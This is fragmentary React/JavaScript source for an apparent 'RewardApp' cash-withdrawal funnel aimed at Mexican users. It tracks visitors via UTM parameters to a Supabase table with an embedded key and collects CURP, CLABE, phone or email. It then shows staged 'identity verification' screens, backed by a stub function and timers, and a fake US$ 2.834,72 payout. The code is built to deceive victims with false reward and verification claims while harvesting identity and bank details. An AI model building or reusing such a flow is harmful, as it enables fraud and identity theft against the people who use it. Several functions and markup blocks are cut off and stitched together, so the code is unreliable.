  const SUPABASE_URL = 'https://gzsxyczfckipomlkdivr.supabase.co';
  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd6c3h5Y3pmY2tpcG9tbGtkaXZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYxMjQxNzMsImV4cCI6MjA5MTcwMDE3M30.L-jZ8EfTz-XdYf7nb6nKwpd6Y4JOejBMrIEDIe1Q6iY'; // Settings → API → anon public

  // ─────────────────────────────────────────
  // 1. Gera ou recupera o session_id único
  // ─────────────────────────────────────────
  let sessionId = localStorage.getItem('_sid');
  if (!sessionId) {
    sessionId = 'sid_' + Math.random().toString(36).substr(2, 16) + '_' + Date.now();
    localStorage.setItem('_sid', sessionId);
  }

  // ─────────────────────────────────────────
  // 2. Captura UTMs da URL atual
  // ─────────────────────────────────────────
  const params = new URLSearchParams(window.location.search);
  const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
  let hasUtm = false;

  utmKeys.forEach(function (key) {
    if (params.get(key)) {
      localStorage.setItem(key, params.get(key));
      hasUtm = true;
    }
  });

  // ─────────────────────────────────────────
  // 3. Salva no Supabase se vier com UTM
  // ─────────────────────────────────────────
  if (hasUtm) {
    var payload = {
      session_id: sessionId,
      utm_source:   localStorage.getItem('utm_source'),
      utm_medium:   localStorage.getItem('utm_medium'),
      utm_campaign: localStorage.getItem('utm_campaign'),
      utm_content:  localStorage.getItem('utm_content'),
      utm_term:     localStorage.getItem('utm_term'),
      page_url:     window.location.href
    };

    fetch(SUPABASE_URL + '/rest/v1/visitors', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
        'Prefer': 'resolution=merge-duplicates'
      },
      body: JSON.stringify(payload)
    }).then(function (res) {
      if (res.ok) console.log('[Tracker] Visitante salvo ✅');
      else console.warn('[Tracker] Erro ao salvar visitante');
    }).catch(function (err) {
      console.error('[Tracker] Erro:', err);
    });
  }

  // ─────────────────────────────────────────
  // 4. Expõe o sessionId globalmente
  //    Use window._sid nos botões de compra
  // ─────────────────────────────────────────
  window._sid = sessionId;

})();
</script>

    // SHA-256 para hashing de dados do usuário (melhora match rate)
    async function sha256(str) {
      if (!str) return '';
      try {
        const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str.toLowerCase().trim()));
        return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
      } catch(e) { return ''; }
    }

    // -- Animated counter ------------------------------------------
    function useCounter(end, ms = 1800, on = true) {
      const [v, setV] = useState(0);
      useEffect(() => {
        if (!on) { setV(0); return; }
        const t0 = performance.now();
        let raf;
        const tick = (now) => {
          const p = Math.min((now - t0) / ms, 1);
          setV(Math.round((1 - Math.pow(1 - p, 3)) * end));
          if (p < 1) raf = requestAnimationFrame(tick);
        };
        raf = requestAnimationFrame(tick);
        return () => cancelAnimationFrame(raf);
      }, [end, ms, on]);
      return v;
    }

      const [hasMore, setHasMore] = useState(false);

      const [displayPts, setDisplayPts] = useState(pts);
      const [ptsGlow, setPtsGlow]       = useState(false);
      const prevPts = useRef(pts);

      // Animação do contador de missões completadas
      const [displayDone, setDisplayDone] = useState(done);
      const [doneGlow, setDoneGlow]       = useState(false);
      const prevDone = useRef(done);

      // Largura animada da barra de progresso
      const [barWidth, setBarWidth]   = useState((done / tasks.length) * 100);
      const [barPulse, setBarPulse]   = useState(false);

      useEffect(() => {
        if (pts === prevPts.current) return;
        const from = prevPts.current;
        const to   = pts;
        prevPts.current = pts;
        setPtsGlow(true);
        const ms  = 900;
        const t0  = performance.now();
        let raf;
        const tick = (now) => {
          const p = Math.min((now - t0) / ms, 1);
          const ease = 1 - Math.pow(1 - p, 3);
          setDisplayPts(Math.round(from + (to - from) * ease));
          if (p < 1) raf = requestAnimationFrame(tick);
          else { setDisplayPts(to); setTimeout(() => setPtsGlow(false), 600); }
        };
        raf = requestAnimationFrame(tick);
        return () => cancelAnimationFrame(raf);
      }, [pts]);

      // Celebração inline ao completar tudo
      const [celebrating, setCelebrating] = useState(false);

      useEffect(() => {
        if (done === prevDone.current) return;
        prevDone.current = done;
        // Anima contador de missões
        setDoneGlow(true);
        setTimeout(() => setDisplayDone(done), 80);
        setTimeout(() => setDoneGlow(false), 800);
        // Anima barra de progresso com pulso
        setBarPulse(true);
        setBarWidth((done / tasks.length) * 100);
        setTimeout(() => setBarPulse(false), 1000);
        // Se completou tudo, dispara celebração
        if (done === tasks.length) {

        }

        const el = listRef.current;
        if (!el) return;
        setHasMore(el.scrollTop + el.clientHeight < el.scrollHeight - 10);
      };

      useEffect(() => {
        checkScroll();
        const el = listRef.current;
        if (el) el.addEventListener('scroll', checkScroll);

    // -- Máscaras México --------------------------------------------
    function applyMask(value, tipo) {
      const digits = value.replace(/\D/g, '');
      if (tipo === 'CURP') {
        return value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase().slice(0, 18);
      }
      if (tipo === 'Celular') {
        return digits
          .slice(0, 10)
          .replace(/(\d{2})(\d)/, '($1) $2')
          .replace(/\((\d{2})\) (\d{4})(\d)/, '($1) $2-$3')
          .slice(0, 14);
      }
      if (tipo === 'CLABE') {
        return digits.slice(0, 18).replace(/(\d{3})(?=\d)/g, '$1 ').trim();
      }
      return value;
    }

    // -- Validação CURP ---------------------------------------------
    function validarCURP(CURP) {
      const clean = (CURP || '').replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
      return /^[A-Z][AEIOUX][A-Z]{2}\d{6}[HM][A-Z]{5}[A-Z0-9]\d$/.test(clean);
    }

    // -- Busca CURP na API ------------------------------------------
    async function fetchCURPFecha(CURP) {
      const clean = (CURP || '').replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
      return clean ? { NOME:'Usuario RewardApp', CURP: clean } : null;
    }

    function getPlaceholder(tipo) {
      if (tipo === 'CURP')            return 'GODE561231HDFABC09';
      if (tipo === 'Celular')        return '(55) 1234-5678';
      if (tipo === 'Email')          return 'seu@email.com';
      if (tipo === 'CLABE')          return '002 010 0777777777 1';
      return '';
    }

    // -- SPEI Form --------------------------------------------------
    function SPEIForm({ onBack, onConfirm }) {
      const [tipo, setTipo]       = useState('');
      const [chave, setClave]     = useState('');
      const [CURPExtra, setCURPExtra] = useState('');
      const [loading, setLoading]     = useState(false);
      const [dropOpen, setDropOpen]   = useState(false);
      const [showHint, setShowHint]   = useState(false);
      const [flashClave, setFlashClave] = useState(false);
      const [flashCURP, setFlashCURP]   = useState(false);
      const CURPExtraRef = React.useRef(null);

      const tipoOpts = [
        { value:'CURP',    icon:'ID',  desc:'Clave Unica de Registro de Poblacion' },
        { value:'CLABE',   icon:'MX',  desc:'Cuenta CLABE de 18 digitos' },
        { value:'Email',   icon:'@',   desc:'Direccion de correo electronico' },
        { value:'Celular', icon:'TEL', desc:'Numero mexicano a 10 digitos' },
      ];
      const tipoSel = tipoOpts.find(o => o.value === tipo) || { value:'Tipo de cuenta SPEI', icon:'MX', desc:'Toca para seleccionar' };

      const inputStyle = {
        width:'100%',
        background:'rgba(0,0,0,0.22)',
        border:'1.5px solid rgba(255,255,255,0.28)',
        borderRadius:14,
        padding:'14px 16px',
        color:'#fff',
        fontSize:15,
        fontWeight:500,
        outline:'none',
        transition:'border 0.2s, background 0.2s',
      };
      const labelStyle = {
        color:'rgba(255,255,255,0.85)',
        fontSize:13,
        fontWeight:700,
        letterSpacing:0.3,
        marginBottom:7,
        display:'block',
      };

      const handleTipo = (val) => {
        setTipo(val);
        setClave('');
        setCURPExtra('');
      };

      const handleClave = (e) => {
        setClave(applyMask(e.target.value, tipo));
      };

      const handleCURPExtra = (e) => {
        setCURPExtra(applyMask(e.target.value, 'CURP'));
      };

      // Validação do CURP extra (quando o tipo de chave não é CURP)
      const CURPExtraDigits   = CURPExtra.replace(/[^a-zA-Z0-9]/g,'');
      const CURPExtraCompleto = CURPExtraDigits.length === 18;
      const CURPExtraValido   = CURPExtraCompleto && validarCURP(CURPExtra);
      const CURPExtraErro     = CURPExtraCompleto && !CURPExtraValido;
      const precisaCURPExtra  = tipo !== 'CURP';

      // -- Validações por tipo --------------------------------------
      const digits = chave.replace(/\D/g,'');
      const alnum  = chave.replace(/[^a-zA-Z0-9]/g,'');

      // CURP
      const CURPCompleto = tipo === 'CURP' && alnum.length === 18;
      const CURPValido   = tipo === 'CURP' ? validarCURP(chave) : true;
      const CURPErro     = CURPCompleto && !CURPValido;

      // Email
      const emailValido  = tipo === 'Email' ? /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(chave.trim()) : true;

    // -- CURP Verify ------------------------------------------------
    function CURPVerify({ SPEIFecha, onConfirm, onBack }) {
      useEffect(() => { track('etapa_5_verificacao_CURP'); }, []);
      const isCURPKey  = SPEIFecha?.tipo === 'CURP';
      const preFilled = isCURPKey ? SPEIFecha.chave : '';
      const [CURP, setCURP]         = useState(preFilled);
      const [cotacao, setCotacao] = useState(null);
      // fase: null=form, 'consulting'=consultando, 'confirmed'=confirmado
      const [fase, setFase]       = useState(isCURPKey ? 'consulting' : null);
      const [userFecha, setUserFecha] = useState(null);

      // Busca cotizacion USD/MXN al montar
      useEffect(() => {
        fetch('https://economia.awesomeapi.com.br/json/last/USD-MXN')
          .then(r => r.json())
          .then(d => {
            const bid = parseFloat(d?.USDMXN?.bid);
            if (!isNaN(bid)) setCotacao(bid);
          })
          .catch(() => {});
      }, []);

      // Auto-inicia verificacion quando tipo é CURP (pula formulário)
      useEffect(() => {
        if (!isCURPKey) return;
        const run = async () => {
          const [ud] = await Promise.all([
            fetchCURPFecha(preFilled),
            new Promise(res => setTimeout(res, 3500)),
          ]);
          setUserFecha(ud);
          setFase('confirmed');
          setTimeout(() => onConfirm(preFilled, ud), 3000);
        };
        run();
      }, []);

      const handleCURP = (e) => setCURP(applyMask(e.target.value, 'CURP'));
      const completo  = CURP.replace(/[^a-zA-Z0-9]/g,'').length === 18;
      const valido    = validarCURP(CURP);
      const erro      = completo && !valido;

      const cien_dolares_mxn = cotacao
        ? (cotacao * 100).toLocaleString('es-MX', { minimumFractionDigits:2, maximumFractionDigits:2 })
        : null;

      const handleConfirmar = async () => {
        if (!valido || fase) return;
        // Fase 1 — consultando (busca API + tempo mínimo de exibição de 3.5s)
        setFase('consulting');
        const [ud] = await Promise.all([
          fetchCURPFecha(CURP),
          new Promise(res => setTimeout(res, 3500)),
        ]);
        setUserFecha(ud);
        // Fase 2 — confirmado (exibe sucesso por 3s antes de avançar)
        setFase('confirmed');
        setTimeout(() => onConfirm(CURP, ud), 3000);
      };

      // -- Fase 1: Consultando datos ---------------------------------
      if (fase === 'consulting') {
        return (
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', minHeight:'100vh', padding:'28px 22px', textAlign:'center', animation:'bounceIn 0.35s cubic-bezier(0.34,1.1,0.64,1) both' }}>
            <style>{`
              @keyframes CURPSpin    { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
              @keyframes CURPPulse   { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(0.85)} }
              @keyframes stepFadeIn { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }
            `}</style>

            {/* Spinner com ícone */}
            <div style={{ position:'relative', width:110, height:110, marginBottom:32 }}>
              <svg style={{ position:'absolute', top:0, left:0, animation:'CURPSpin 1.2s linear infinite' }} width="110" height="110" viewBox="0 0 110 110">
                <circle cx="55" cy="55" r="48" fill="none" stroke="rgba(255,255,255,0.15)" strokeWidth="6"/>
                <circle cx="55" cy="55" r="48" fill="none" stroke="#fff" strokeWidth="6"
                  strokeDasharray="70 232" strokeLinecap="round"/>
              </svg>
              <div style={{ position:'absolute', inset:0, display:'flex', alignItems:'center', justifyContent:'center', fontSize:44 }}>
                🔍
              </div>
            </div>

            <h2 style={{ color:'#fff', fontSize:24, fontWeight:900, margin:'0 0 12px', textShadow:'0 2px 12px rgba(0,0,0,0.4)' }}>Consultando datos</h2>
            <p style={{ color:'rgba(255,255,255,0.92)', fontSize:15, margin:'0 0 36px', lineHeight:1.75, textShadow:'0 1px 6px rgba(0,0,0,0.3)' }}>
              Verificando la CURP ingresada<br/>en la base de datos...
            </p>

            {/* Passos com fade-in sequencial */}
            <div style={{ width:'100%', maxWidth:270, textAlign:'left' }}>
              {[
                { label:'Validando CURP',          delay:'0s' },
                { label:'Consultando registro',   delay:'1s' },
                { label:'Confirmando identidad', delay:'2s' },
              ].map((item, i) => (
                <div key={i} style={{ display:'flex', alignItems:'center', gap:12, marginBottom:16, opacity:0, animation:`stepFadeIn 0.5s ${item.delay} ease forwards` }}>
                  <div style={{ width:32, height:32, borderRadius:'50%', background:'rgba(0,0,0,0.25)', border:'2px solid rgba(255,255,255,0.6)', display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0 }}>
                    <div style={{ width:9, height:9, borderRadius:'50%', background:'#fff', animation:`CURPPulse 1.3s ${item.delay} ease-in-out infinite` }}/>
                  </div>
                  <span style={{ color:'#fff', fontSize:15, fontWeight:700, textShadow:'0 1px 6px rgba(0,0,0,0.35)' }}>{item.label}</span>

          </div>
        );
      }

      // -- Fase 2: Identidad confirmada -----------------------------
      if (fase === 'confirmed') {
        return (
          <div style={{ position:'relative', display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', minHeight:'100vh', padding:'28px 22px', textAlign:'center', animation:'bounceIn 0.4s cubic-bezier(0.34,1.2,0.64,1) both' }}>
            <style>{`
              @keyframes shieldPop { 0%{transform:scale(0.2);opacity:0} 65%{transform:scale(1.15)} 80%{transform:scale(0.97)} 100%{transform:scale(1);opacity:1} }
              @keyframes checkDraw { from{stroke-dashoffset:60} to{stroke-dashoffset:0} }
              @keyframes idConfetti { 0%{transform:translateY(-20px) rotate(0deg);opacity:1} 100%{transform:translateY(120px) rotate(400deg);opacity:0} }
              @keyframes glowPulse  { 0%,100%{box-shadow:0 0 0 0 rgba(255,255,255,0.25)} 50%{box-shadow:0 0 0 16px rgba(255,255,255,0)} }
            `}</style>

            {/* Confetti */}
            <div style={{ position:'absolute', top:60, left:0, right:0, pointerEvents:'none', overflow:'hidden', height:140 }}>
              {['#fff','#25F4EE','#fff','#FE2C55','#fff','#25F4EE','#fff','#FE2C55'].map((c,i) => (
                <div key={i} style={{ position:'absolute', left:`${6+i*12}%`, top:0, width:i%2===0?9:6, height:i%2===0?9:6, borderRadius:i%3===0?'50%':3, background:c, opacity:0.9, animation:`idConfetti ${1+i*0.13}s ${i*0.1}s ease-in forwards` }}/>
              ))}
            </div>

            {/* Escudo com glow */}
            <div style={{ position:'relative', marginBottom:28, animation:'shieldPop 0.6s cubic-bezier(0.34,1.2,0.64,1) both' }}>
              <div style={{ width:110, height:110, borderRadius:'50%', background:'rgba(0,0,0,0.25)', border:'3px solid rgba(255,255,255,0.9)', display:'flex', alignItems:'center', justifyContent:'center', animation:'glowPulse 2s 0.6s ease-in-out infinite' }}>
                <svg width="56" height="56" viewBox="0 0 48 48" fill="none">
                  <path d="M24 4L8 10v12c0 10 7 19 16 22 9-3 16-12 16-22V10L24 4z" fill="rgba(255,255,255,0.15)" stroke="#fff" strokeWidth="2.2" strokeLinejoin="round"/>
                  <path d="M16 24l6 6 10-12" stroke="#fff" strokeWidth="3.2" strokeLinecap="round" strokeLinejoin="round"
                    strokeDasharray="60" strokeDashoffset="60" style={{ animation:'checkDraw 0.5s 0.3s ease forwards' }}/>
                </svg>
              </div>
            </div>

            <h2 style={{ color:'#fff', fontSize:26, fontWeight:900, margin:'0 0 12px', textShadow:'0 2px 16px rgba(0,0,0,0.4)' }}>
              Identidad localizada!
            </h2>
            <p style={{ color:'rgba(255,255,255,0.92)', fontSize:15, margin:'0 0 10px', lineHeight:1.75, textShadow:'0 1px 8px rgba(0,0,0,0.3)' }}>
              CURP encontrada en la base de datos.<br/>Preparando confirmación...
            </p>

            {/* Barra de progresso */}
            <div style={{ width:'70%', maxWidth:220, height:5, background:'rgba(0,0,0,0.2)', borderRadius:4, overflow:'hidden', marginTop:22, marginBottom:14 }}>
              <div style={{ height:'100%', borderRadius:4, background:'rgba(255,255,255,0.9)', animation:'progressBar 3s linear forwards' }}/>
            </div>

            <div style={{ color:'rgba(255,255,255,0.7)', fontSize:13, fontWeight:500, textShadow:'0 1px 6px rgba(0,0,0,0.3)' }}>Redirigiendo automáticamente...</div>
          </div>
        );
      }

      // -- Formulário principal --------------------------------------
      const inputStyle = {
        width:'100%', background:'rgba(0,0,0,0.22)',
        border:`1.5px solid ${erro ? 'rgba(248,113,113,0.7)' : completo && valido ? 'rgba(52,211,153,0.7)' : 'rgba(255,255,255,0.28)'}`,
        borderRadius:14, padding:'14px 44px 14px 16px',
        color:'#fff', fontSize:15, fontWeight:500, outline:'none',
        transition:'border 0.2s, background 0.2s',
      };

      return (
        <div style={{ padding:'36px 24px 28px', display:'flex', flexDirection:'column', minHeight:680, animation:'slideInR 0.4s cubic-bezier(0.34,1.1,0.64,1) both' }}>
          <button onClick={onBack} style={{ display:'inline-flex', alignItems:'center', gap:7, background:'rgba(255,255,255,0.10)', backdropFilter:'blur(10px)', border:'1px solid rgba(255,255,255,0.18)', borderRadius:30, color:'#fff', fontSize:13, fontWeight:700, cursor:'pointer', padding:'8px 16px 8px 12px', marginBottom:24, transition:'all 0.2s' }}
            onMouseEnter={e => e.currentTarget.style.background='rgba(255,255,255,0.18)'}
            onMouseLeave={e => e.currentTarget.style.background='rgba(255,255,255,0.10)'}
          >
            <span style={{ fontSize:16, lineHeight:1 }}>‹</span> Volver
          </button>

          <div style={{ textAlign:'center', marginBottom:20 }}>
            <div style={{ fontSize:52, marginBottom:12 }}>🔐</div>
            <h2 style={{ color:'#fff', fontSize:22, fontWeight:900, margin:'0 0 8px' }}>Confirmar identidad</h2>
            <p style={{ color:'rgba(255,255,255,0.90)', fontSize:14, lineHeight:1.65, margin:0 }}>
              Ingresa tu CURP para confirmar la identidad y continuar con la solicitud de retiro.
            </p>
          </div>

          {/* Aviso limite US$100 */}
          <div style={{ background:'rgba(0,0,0,0.28)', border:'1.5px solid rgba(251,191,36,0.45)', borderRadius:16, padding:'14px 16px', marginBottom:20 }}>
            <div style={{ display:'flex', alignItems:'flex-start', gap:10 }}>
              <span style={{ fontSize:20, flexShrink:0, marginTop:1 }}>⚠️</span>
              <div>
                <div style={{ color:'#25F4EE', fontSize:13, fontWeight:800, marginBottom:5 }}>
                  Verificacion obligatoria arriba de US$ 100
                </div>
                <div style={{ color:'rgba(255,255,255,0.92)', fontSize:13, lineHeight:1.65 }}>
                  El valor solicitado <strong style={{ color:'#25F4EE' }}>(US$ 2.834,72)</strong> supera el equivalente a{' '}
                  <strong style={{ color:'#25F4EE' }}>US$ 100</strong>
                  {cien_dolares_mxn ? <> (hoy = <strong style={{ color:'#25F4EE' }}>MX$ {cien_dolares_mxn}</strong>)</> : null}.{' '}
                  Por eso es necesario confirmar la CURP vinculada a la cuenta para liberar el retiro.
                </div>
                {cotacao && (
                  <div style={{ marginTop:8, display:'inline-flex', alignItems:'center', gap:6, background:'rgba(0,0,0,0.3)', borderRadius:8, padding:'4px 10px' }}>
                    <span style={{ color:'rgba(255,255,255,0.75)', fontSize:11 }}>Cotizacion del dia:</span>
                    <span style={{ color:'#25F4EE', fontSize:12, fontWeight:800 }}>
                      US$ 1 = MX$ {cotacao.toLocaleString('es-MX', { minimumFractionDigits:2, maximumFractionDigits:2 })}
                    </span>
                  </div>
                )}
              </div>
            </div>
          </div>

          <div style={{ marginBottom:8 }}>
            <label style={{ color:'rgba(255,255,255,0.92)', fontSize:13, fontWeight:700, marginBottom:7, display:'block' }}>CURP</label>
            <div style={{ position:'relative' }}>
              <input
                value={CURP}
                onChange={handleCURP}
                placeholder="GODE561231HDFABC09"
                inputMode="text"
                autoFocus
                style={inputStyle}
                onFocus={e => { e.target.style.background='rgba(0,0,0,0.35)'; }}
                onBlur={e  => { e.target.style.background='rgba(0,0,0,0.22)'; }}
              />
              {completo && (
                <span style={{ position:'absolute', right:14, top:'50%', transform:'translateY(-50%)', fontSize:18 }}>
                  {valido ? '✅' : '❌'}
                </span>
              )}
            </div>
            <div style={{ marginTop:6, fontSize:12, fontWeight:600, minHeight:18 }}>
              {erro      && <span style={{ color:'#F87171' }}>CURP invalida. Verifica los datos ingresados.</span>}
              {completo && valido && <span style={{ color:'#34D399' }}>CURP valida</span>}
              {!completo && CURP.length > 0 && <span style={{ color:'rgba(255,255,255,0.92)' }}>{CURP.replace(/[^a-zA-Z0-9]/g,'').length}/18 caracteres</span>}
            </div>
          </div>

          {preFilled && (
            <div style={{ background:'rgba(52,211,153,0.08)', border:'1px solid rgba(52,211,153,0.2)', borderRadius:12, padding:'10px 14px', marginTop:8, marginBottom:16 }}>
              <div style={{ color:'rgba(255,255,255,0.88)', fontSize:12 }}>
                CURP completada automaticamente a partir de tu cuenta SPEI.
              </div>
            </div>
          )}

          <div style={{ flex:1 }}/>

          <Btn onClick={handleConfirmar} variant={valido ? 'gold' : 'ghost'} disabled={!valido || !!fase}>
            Confirmar identidad
          </Btn>
        </div>
      );
    }

    // -- CURP Fecha Confirm -----------------------------------------
    function CURPFechaConfirm({ CURP, userFecha, onBack, onConfirm, onCorrect, confirmLabel, animationType }) {
      const [transferring, setTransferring] = useState(false);
      const [SPEIPhase, setSPEIPhase] = useState(1); // 1=cadastrando, 2=sucesso

      // Só exibe campos que têm valor real
      const rows = userFecha ? [
        userFecha.NOME                         && ['Nombre completo', userFecha.NOME],
        CURP                                   && ['CURP',           CURP],
        userFecha.NASC                         && ['Fecha de nacimiento', userFecha.NASC],
        userFecha.NOME_MAE                     && ['Nombre de la madre',   userFecha.NOME_MAE],
      ].filter(Boolean) : (CURP ? [['CURP', CURP]] : []);

      const handleConfirm = () => {
        setTransferring(true);
        if (animationType === 'SPEI-key') {
          // Fase 1: cadastrando... (1.8s)
          setSPEIPhase(1);
          setTimeout(() => {
            // Fase 2: sucesso! (1.6s)
            setSPEIPhase(2);
            setTimeout(() => {
              setTransferring(false);
              onConfirm();
            }, 1800);
          }, 1800);
        } else {
          // Animação padrão de transferencia
          setTimeout(() => {
            setTransferring(false);
            onConfirm();
          }, 2500);
        }
      };

      // Tela de animação SPEI key
      if (transferring && animationType === 'SPEI-key') {
        if (SPEIPhase === 1) {
          return (
            <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', minHeight:680, padding:'28px 22px', textAlign:'center', animation:'bounceIn 0.4s cubic-bezier(0.34,1.1,0.64,1) both' }}>
              <style>{`
                @keyframes SPEIKeySpin { 0%{transform:rotate(-15deg) scale(1)} 50%{transform:rotate(15deg) scale(1.12)} 100%{transform:rotate(-15deg) scale(1)} }
                @keyframes progressBar { from{width:0%} to{width:100%} }
                @keyframes spinDot { to{transform:rotate(360deg)} }
              `}</style>

              {/* Ícone com fundo escuro para destacar */}
              <div style={{ position:'relative', marginBottom:28 }}>
                <div style={{ width:100, height:100, borderRadius:'50%', background:'rgba(0,0,0,0.30)', backdropFilter:'blur(10px)', border:'2px solid rgba(255,255,255,0.25)', display:'flex', alignItems:'center', justifyContent:'center', boxShadow:'0 8px 32px rgba(0,0,0,0.25)' }}>
                  <div style={{ fontSize:52, animation:'SPEIKeySpin 1.2s ease-in-out infinite' }}>🔑</div>
                </div>
                {/* Spinner ao redor */}
                <svg style={{ position:'absolute', top:-6, left:-6, animation:'spinDot 1.4s linear infinite' }} width="112" height="112" viewBox="0 0 112 112">
                  <circle cx="56" cy="56" r="52" fill="none" stroke="rgba(255,255,255,0.15)" strokeWidth="4"/>
                  <circle cx="56" cy="56" r="52" fill="none" stroke="#FE2C55" strokeWidth="4"
                    strokeDasharray="60 267" strokeLinecap="round"/>
                </svg>
              </div>

              <h2 style={{ color:'#fff', fontSize:22, fontWeight:900, margin:'0 0 10px', textShadow:'0 2px 12px rgba(0,0,0,0.4)' }}>Cadastrando chave SPEI</h2>
              <p style={{ color:'rgba(255,255,255,0.95)', fontSize:14, margin:'0 0 32px', lineHeight:1.75 }}>
                Estamos registrando tu clave<br/>con seguridad. Espera un momento...
              </p>

              {/* Barra de progresso */}
              <div style={{ width:'100%', maxWidth:260, height:6, background:'rgba(0,0,0,0.25)', borderRadius:4, overflow:'hidden', marginBottom:14 }}>
                <div style={{ height:'100%', borderRadius:4, background:'linear-gradient(90deg,#FE2C55,#25F4EE)', animation:'progressBar 1.8s linear forwards', boxShadow:'0 0 8px rgba(251,191,36,0.6)' }}/>
              </div>
              <div style={{ color:'rgba(255,255,255,0.80)', fontSize:12, letterSpacing:0.5, fontWeight:600 }}>Validando datos de la clave...</div>
            </div>
          );
        }

        if (SPEIPhase === 2) {
          return (
            <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', minHeight:680, padding:'28px 22px', textAlign:'center', animation:'bounceIn 0.45s cubic-bezier(0.34,1.2,0.64,1) both' }}>
              <style>{`
                @keyframes successPop { 0%{transform:scale(0.3);opacity:0} 60%{transform:scale(1.18);opacity:1} 80%{transform:scale(0.95)} 100%{transform:scale(1)} }
                @keyframes checkRing { 0%{opacity:0;transform:scale(0.5)} 100%{opacity:1;transform:scale(1)} }
                @keyframes confettiRain { 0%{transform:translateY(-20px) rotate(0deg);opacity:1} 100%{transform:translateY(80px) rotate(360deg);opacity:0} }
              `}</style>
              {/* Confetti */}
              <div style={{ position:'absolute', top:120, left:0, right:0, pointerEvents:'none', overflow:'hidden', height:120 }}>
                {['#FE2C55','#34D399','#25F4EE','#FE2C55','#25F4EE'].map((c,i) => (
                  <div key={i} style={{ position:'absolute', left:`${15+i*18}%`, top:0, width:8, height:8, borderRadius:2, background:c, animation:`confettiRain ${0.9+i*0.15}s ${i*0.1}s ease-in forwards` }}/>
                ))}
                {['#25F4EE','#FE2C55','#34D399','#25F4EE'].map((c,i) => (
                  <div key={i+5} style={{ position:'absolute', left:`${8+i*22}%`, top:0, width:6, height:6, borderRadius:'50%', background:c, animation:`confettiRain ${1+i*0.12}s ${0.2+i*0.15}s ease-in forwards` }}/>
                ))}
              </div>

              {/* Ícone de sucesso */}
              <div style={{ position:'relative', marginBottom:28 }}>
                <div style={{ width:104, height:104, borderRadius:'50%', background:'rgba(0,0,0,0.30)', backdropFilter:'blur(10px)', border:'3px solid rgba(52,211,153,0.7)', display:'flex', alignItems:'center', justifyContent:'center', animation:'checkRing 0.4s cubic-bezier(0.34,1.2,0.64,1) both', boxShadow:'0 0 32px rgba(52,211,153,0.35)' }}>
                  <div style={{ fontSize:56, animation:'successPop 0.5s 0.1s cubic-bezier(0.34,1.2,0.64,1) both', display:'inline-block' }}>✅</div>
                </div>
              </div>

              <h2 style={{ color:'#fff', fontSize:24, fontWeight:900, margin:'0 0 12px', textShadow:'0 0 20px rgba(52,211,153,0.7), 0 2px 12px rgba(0,0,0,0.4)' }}>Cuenta SPEI cadastrada!</h2>
              <p style={{ color:'rgba(255,255,255,0.95)', fontSize:15, margin:'0 0 14px', lineHeight:1.75, textShadow:'0 1px 8px rgba(0,0,0,0.3)' }}>
                Tu cuenta fue registrada correctamente.<br/>Generando comprobante...
              </p>
              <div style={{ color:'rgba(255,255,255,0.75)', fontSize:12, marginTop:4, fontWeight:600, letterSpacing:0.4 }}>Redirigiendo automáticamente...</div>
            </div>
          );
        }
      }

      // Tela de transição — realizando transferencia (padrão)
      if (transferring) {
        return (
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', minHeight:680, padding:'28px 22px', textAlign:'center', animation:'bounceIn 0.4s cubic-bezier(0.34,1.1,0.64,1) both' }}>
            <div style={{ fontSize:64, marginBottom:20, animation:'bounceTrophy 0.8s ease-in-out infinite alternate' }}>💸</div>
            <h2 style={{ color:'#fff', fontSize:22, fontWeight:900, margin:'0 0 10px' }}>Realizando transferencia</h2>
            <p style={{ color:'rgba(255,255,255,0.88)', fontSize:14, margin:'0 0 32px', lineHeight:1.65 }}>
              Espera, estamos procesando<br/>tu retiro de <strong style={{ color:'#25F4EE' }}>US$ 2.834,72</strong>
            </p>
            {/* Barra de progresso animada */}
            <div style={{ width:'100%', maxWidth:260, height:6, background:'rgba(255,255,255,0.1)', borderRadius:4, overflow:'hidden', marginBottom:18 }}>
              <div style={{
                height:'100%', borderRadius:4,
                background:'linear-gradient(90deg,#25F4EE,#FE2C55)',
                animation:'progressBar 2.5s linear forwards',
              }}/>
            </div>
            <div style={{ color:'rgba(255,255,255,0.7)', fontSize:13 }}>Verificando datos y liberando retiro...</div>
            <style>{`@keyframes progressBar { from{width:0%} to{width:100%} }`}</style>
          </div>
        );
      }

      return (
        <div style={{ padding:'28px 22px 32px', animation:'slideInR 0.4s cubic-bezier(0.34,1.1,0.64,1) both' }}>
          {!onCorrect && (
            <button onClick={onBack} style={{ display:'inline-flex', alignItems:'center', gap:7, background:'rgba(255,255,255,0.10)', backdropFilter:'blur(10px)', border:'1px solid rgba(255,255,255,0.18)', borderRadius:30, color:'#fff', fontSize:13, fontWeight:700, cursor:'pointer', padding:'8px 16px 8px 12px', marginBottom:22, transition:'all 0.2s' }}
              onMouseEnter={e => e.currentTarget.style.background='rgba(255,255,255,0.18)'}
              onMouseLeave={e => e.currentTarget.style.background='rgba(255,255,255,0.10)'}
            >
              <span style={{ fontSize:16, lineHeight:1 }}>‹</span> Volver
            </button>
          )}

          {/* Header */}
          <div style={{ textAlign:'center', marginBottom:24 }}>
            <div style={{ fontSize:52, marginBottom:10 }}>⚠️</div>
